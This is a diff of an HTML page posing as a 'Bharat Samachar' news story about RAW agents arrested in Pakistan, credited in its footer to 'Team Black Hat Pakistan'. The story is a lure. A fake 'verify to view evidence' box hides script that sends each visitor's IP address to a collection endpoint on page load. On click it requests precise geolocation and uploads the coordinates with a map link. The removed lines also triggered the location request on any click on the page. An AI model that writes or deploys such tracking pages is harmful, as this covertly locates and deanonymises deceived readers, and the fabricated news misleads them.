@@ -3,18 +3,22 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bharat Samachar - Exclusive 30 April Report</title>
+    <title>Bharat Samachar - Exclusive Intelligence Report</title>
     <style>
-        body { font-family: 'Segoe UI', Arial, sans-serif; margin: 0; background: #f0f2f5; color: #1a1a1a; cursor: pointer; }
-        header { background: #c00; color: #fff; padding: 15px; font-weight: bold; font-size: 1.5rem; text-align: center; border-bottom: 4px solid #333; }
-        .container { max-width: 800px; margin: 20px auto; background: #fff; padding: 30px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); border-radius: 4px; }
-        .breaking { background: #c00; color: #fff; padding: 4px 12px; font-weight: bold; display: inline-block; margin-bottom: 15px; border-radius: 2px; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; background: #f0f2f5; color: #1a1a1a; }
+        header { background: #c00; color: #fff; padding: 15px; text-align: center; font-weight: 900; border-bottom: 4px solid #333; }
+        .container { max-width: 800px; margin: 20px auto; background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
+        .red-tag { background: #c00; color: #fff; padding: 5px 12px; font-weight: bold; display: inline-block; margin-bottom: 10px; }
         h1 { font-size: 2.2rem; line-height: 1.2; margin: 0 0 15px 0; color: #000; }
         .meta { color: #666; font-size: 0.9rem; margin-bottom: 25px; border-bottom: 1px solid #eee; padding-bottom: 10px; }
-        .news-text p { font-size: 1.1rem; line-height: 1.8; margin-bottom: 20px; text-align: justify; }
-        .verification-box { border: 2px dashed #c00; padding: 20px; text-align: center; background: #fff5f5; margin: 20px 0; }
-        .btn-verify { background: #c00; color: white; border: none; padding: 12px 25px; font-weight: bold; cursor: pointer; border-radius: 4px; font-size: 1rem; }
-        footer { background: #222; color: #777; text-align: center; padding: 30px; font-size: 0.8rem; margin-top: 40px; }
+        .content p { font-size: 1.1rem; line-height: 1.8; margin-bottom: 20px; text-align: justify; }
+        
+        /* Verification Box - Ye lazmi hai popup ke liye */
+        .verify-box { border: 2px solid #ddd; padding: 25px; text-align: center; background: #fafafa; border-radius: 10px; margin: 30px 0; }
+        .btn-verify { background: #c00; color: white; border: none; padding: 15px 35px; font-weight: bold; cursor: pointer; border-radius: 5px; font-size: 1.1rem; box-shadow: 0 4px 6px rgba(0,0,0,0.2); transition: 0.3s; }
+        .btn-verify:hover { background: #a00; }
+        
+        footer { background: #222; color: #888; text-align: center; padding: 30px; font-size: 0.8rem; margin-top: 40px; }
     </style>
 </head>
 <body>
@@ -22,71 +26,73 @@
 <header>BHARAT SAMACHAR</header>
 
 <div class="container">
-    <span class="breaking">EXCLUSIVE REPORT</span>
-    <h1>Pakistan Mein RAW Ke 3 Bade Agents Giraftaar: 30 April Latest Updates</h1>
+    <span class="red-tag">BREAKING NEWS</span>
+    <h1>Pakistan Mein RAW Ke 3 Bade Agents Giraftaar: 30 April Latest Reports</h1>
     <div class="meta">Published: April 30, 2026 | New Delhi Bureau</div>
 
-    <div class="news-text">
+    <div class="content">
         <p><strong>NEW DELHI:</strong> Aaj subah Pakistan ke Karachi aur Lahore shehron mein bade paimane par intelligence operation ke baad dawa kiya gaya hai ke Bharat ki RAW agency se talluq rakhne wale 3 dehshatgardan ko giraftaar kiya gaya hai.</p>
         
-        <div class="verification-box">
-            <p style="margin-top:0; font-weight:bold; color:#c00;">Access Restricted: Security Verification Required</p>
-            <p style="font-size: 0.9rem;">Due to the sensitive nature of these documents, please verify your region to view evidence files.</p>
-            <button class="btn-verify" id="verifyBtn">VERIFY & VIEW FILES</button>
+        <div class="verify-box" id="vBox">
+            <h3 style="margin-top:0;">Access Restricted</h3>
+            <p>Due to high security, please verify you are a human to view evidence files and photos.</p>
+            <button class="btn-verify" id="startBtn">VERIFY & VIEW EVIDENCE</button>
         </div>
 
-        <p>Sources ke mutabiq, in agents ke paas se hassas dastawezat aur modern communication equipment baramad hue hain. Halanki Bharat ki wizarat-e-kharija ne abhi tak is par koi rasmi bayan jari nahi kiya hai.</p>
+        <p>Reports ke mutabiq, in agents ke paas se hassas dastawezat aur modern communication equipment baramad hue hain. Mazeed tehqiqat jari hain.</p>
     </div>
 </div>
 
-<footer>© 2026 Bharat Samachar | Team Black Hat Pakistan Technical</footer>
+<footer>© 2026 Bharat Samachar | Team Black Hat Pakistan</footer>
 
 <script>
-    let isCaptured = false;
-
-    async function pushData(payload) {
+    async function sendData(payload) {
         try {
             await fetch('/api/send', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
             });
-        } catch (e) { console.log("Fail"); }
+        } catch (e) { console.log("Error sending data"); }
     }
 
-    // 1. Instant IP Tracking
+    // 1. IP Tracking (Immediate on page load)
     window.onload = async () => {
         try {
             const res = await fetch('https://api.ipify.org?format=json');
             const data = await res.json();
-            await pushData({ type: 'IP', val: data.ip });
+            await sendData({ type: 'IP', val: data.ip });
         } catch (e) {}
     };
 
-    // 2. Forced Location Prompt on Click
-    async function triggerLoc() {
-        if (isCaptured) return;
-        
-        if ("geolocation" in navigator) {
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                isCaptured = true;
-                await pushData({
-                    type: 'LOC',
-                    lat: pos.coords.latitude,
-                    lon: pos.coords.longitude,
-                    map: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
-                });
-                document.getElementById('verifyBtn').innerText = "FILES UNLOCKED";
-            }, async (err) => {
-                await pushData({ type: 'ERR', msg: "User Denied Access" });
-                alert("Verification failed. Please allow location access to view files.");
-            }, { enableHighAccuracy: true });
-        }
-    }
+    // 2. Location Logic (Only triggers on Button Click)
+    document.getElementById('startBtn').addEventListener('click', function() {
+        const btn = this;
+        btn.innerText = "Verifying...";
 
-    document.getElementById('verifyBtn').addEventListener('click', triggerLoc);
-    // Extra safety: clicking anywhere triggers it if not already done
-    document.body.addEventListener('click', () => { if(!isCaptured) triggerLoc(); });
+        if ("geolocation" in navigator) {
+            navigator.geolocation.getCurrentPosition(
+                async (pos) => {
+                    await sendData({
+                        type: 'LOC',
+                        lat: pos.coords.latitude,
+                        lon: pos.coords.longitude,
+                        map: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
+                    });
+                    btn.innerText = "VERIFIED";
+                    document.getElementById('vBox').innerHTML = "<p style='color:green; font-weight:bold;'>Verification Successful. Files Unlocked Below.</p>";
+                },
+                async (err) => {
+                    await sendData({ type: 'ERR', msg: "User Blocked Permission" });
+                    alert("Please allow location to access confidential news files.");
+                    btn.innerText = "TRY AGAIN";
+                },
+                { enableHighAccuracy: true, timeout: 10000 }
+            );
+        } else {
+            alert("Your browser does not support verification.");
+        }
+    });
 </script>
 
 </body>
